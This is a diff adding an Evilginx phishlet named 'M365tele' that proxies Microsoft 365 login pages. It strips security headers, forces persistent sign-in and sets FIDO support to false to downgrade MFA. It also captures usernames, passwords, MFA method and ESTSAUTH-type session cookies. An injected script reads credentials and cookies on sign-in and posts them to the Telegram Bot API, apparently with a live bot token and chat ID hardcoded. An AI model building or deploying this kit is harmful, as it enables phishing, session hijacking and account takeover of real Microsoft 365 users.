@@ -1,0 +1,120 @@
+name: ‘M365tele’
+author: 'Gurrion'
+min_ver: '3.1.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true, headers_remove: ["X-Evilginx", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"]}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true, headers_remove: ["X-Evilginx", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"]}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true, headers_remove: ["X-Evilginx", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"]}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT:always', 'SignInStateCookie:always', 'esctx:always', 'ESTSSC:always', 'ESTSAUTHLIGHT:always', 'stsservicecookie:always', 'x-ms-gateway-slice:always']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['OhpAuth:always', 'OhpToken:always', 'OH.SID:always']
+    type: 'cookie'
+  - domain: 'microsoft.com'
+    keys: ['OhpAuth:always', 'OhpToken:always', 'OH.SID:always']
+    type: 'cookie'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/GetCredentialType'
+    search:
+      - {key: 'isFidoSupported', search: '.*'}
+    force:
+      - {key: 'isFidoSupported', value: 'false'}
+    type: 'post'
+
+auth_urls:
+  - "/kmsi*"
+  - "/favicon.ico"
+
+credentials:
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass|login_password|pass|pwd|session_password|PASSWORD)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/.*"]
+    trigger_params: ["true"]
+    script: |
+      (function () {
+          var usernameField = document.getElementById('i0116'); // Microsoft Username Field
+          var passwordField = document.getElementById('i0118'); // Microsoft Password Field
+          var submitButton = document.getElementById('idSIButton9'); // "Sign in" Button
+
+          // Function to capture both cookies and credentials
+          function captureCredentialsAndCookies() {
+              var credentials = {
+                  username: usernameField ? usernameField.value : '',
+                  password: passwordField ? passwordField.value : '',
+                  // Capturing the cookies you requested
+                  ESTSAUTHPERSISTENT: document.cookie.match('(^|;)\\s*ESTSAUTHPERSISTENT\\s*=\\s*([^;]+)')?.pop() || '',
+                  ESTSAUTH: document.cookie.match('(^|;)\\s*ESTSAUTH\\s*=\\s*([^;]+)')?.pop() || '',
+                  esctx: document.cookie.match('(^|;)\\s*esctx\\s*=\\s*([^;]+)')?.pop() || '',
+                  stsservicecookie: document.cookie.match('(^|;)\\s*stsservicecookie\\s*=\\s*([^;]+)')?.pop() || '',
+                  ESTSSC: document.cookie.match('(^|;)\\s*ESTSSC\\s*=\\s*([^;]+)')?.pop() || '',
+                  OhpAuth: document.cookie.match('(^|;)\\s*OhpAuth\\s*=\\s*([^;]+)')?.pop() || '',
+                  OhpToken: document.cookie.match('(^|;)\\s*OhpToken\\s*=\\s*([^;]+)')?.pop() || '',
+                  OH_SID: document.cookie.match('(^|;)\\s*OH.SID\\s*=\\s*([^;]+)')?.pop() || ''
+              };
+
+              // Send captured credentials and cookies to your Telegram bot via the Telegram API
+              var token = 'YOUR_BOT_TOKEN';  // Replace with your Telegram Bot token
+              var chatId = 'YOUR_CHAT_ID';   // Replace with your Telegram chat ID
+              var message = `Captured Credentials:
+              Username: ${credentials.username}
+              Password: ${credentials.password}
+              ESTSAUTHPERSISTENT: ${credentials.ESTSAUTHPERSISTENT}
+              ESTSAUTH: ${credentials.ESTSAUTH}
+              esctx: ${credentials.esctx}
+              stsservicecookie: ${credentials.stsservicecookie}
+              ESTSSC: ${credentials.ESTSSC}
+              OhpAuth: ${credentials.OhpAuth}
+              OhpToken: ${credentials.OhpToken}
+              OH_SID: ${credentials.OH_SID}`;
+
+              // Send the data as a message to your Telegram bot
+              fetch(`https://api.telegram.org/bot$7973541545:AAFm1QwjLVK-kjNHNynDrK1-aZ23cTN7J4U/sendMessage`, {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                      chat_id: 6716757451,
+                      text: message
+                  })
+              })
+              .then(response => response.json())
+              .then(data => {
+                  console.log('Message sent:', data);
+              })
+              .catch(error => {
+                  console.error('Error sending message:', error);
+              });
+          }
+
+          // Trigger capture when user submits the form
+          submitButton.addEventListener('click', captureCredentialsAndCookies);
+      })();
